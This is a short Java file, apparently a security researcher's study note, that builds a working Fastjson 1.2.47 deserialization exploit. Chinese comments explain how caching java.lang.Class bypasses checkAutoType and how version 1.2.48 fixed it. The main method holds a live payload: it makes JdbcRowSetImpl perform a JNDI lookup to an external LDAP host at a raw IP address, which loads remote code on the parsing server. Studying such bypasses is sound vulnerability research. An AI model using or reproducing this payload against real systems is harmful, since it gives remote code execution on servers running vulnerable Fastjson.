import com.alibaba.fastjson.JSON;
import com.alibaba.fastjson.parser.ParserConfig;
import com.alibaba.fastjson.parser.deserializer.JavaBeanDeserializer;
import com.alibaba.fastjson.serializer.MiscCodec;

/**
 * Created by xjj on 2023/3/8.
 */
public class FastJson6_LE1247 {
    // 通杀前面的版本
    // 问题出在checkAutoType处, 有缓存过类则不会抛出异常

    // 1.如何缓存?
    // TypeUtils.loadClass() 的时候, 执行下面的代码
    // if (cache) {
    //  mappings.put(className, clazz);
    //}

    // 2.缓存绕过哪里的限制?
    // checkAutoType 处没有被检测出, 没有抛出异常(在黑名单里)
    // 因为我们没有打开autoTypeSupport, 所以黑名单也没检测出来, 即使黑名单检测出来了, 后面有一个判断是否存在缓存, 也能绕过Exception
    // 同时checkAutoType 成功的拿到了我们的 JdbcRowSetImpl类

    // 3.为什么一定要加val作为key?
    // MiscCodec:227有对val的限制
    // JSONToken.LITERAL_STRING 的时候就会判断是否是val

    // 4.为什么是MiscCodec?
    // ParserConfig初始化的时候默认java.lang.Class的deserializer就是MiscCodec
    // deserializers.put(Class.class, MiscCodec.instance);

    // 5.为什么使用java.lang.Class?

    // 6.修复1.2.48
    // 黑名单多了两条，MiscCodec中将默认传入的cache变为false，checkAutoType()调整了逻辑
    //        if (clazz == Class.class) {
    //            return (T) TypeUtils.loadClass(strVal, parser.getConfig().getDefaultClassLoader(), false);
    //        }

    public static void main(String[] args) {
//        ParserConfig
//        MiscCodec
        String jsonStr =
                "{" +
                        "\"a\":{\"@type\":\"java.lang.Class\",\"val\":\"com.sun.rowset.JdbcRowSetImpl\"}," +
                        "\"b\":{\"@type\":\"com.sun.rowset.JdbcRowSetImpl\",\"dataSourceName\":\"ldap://47.95.7.37:1389/Calc\",\"autoCommit\":true}" +
                "}";
        JSON.parseObject(jsonStr);
    }
}
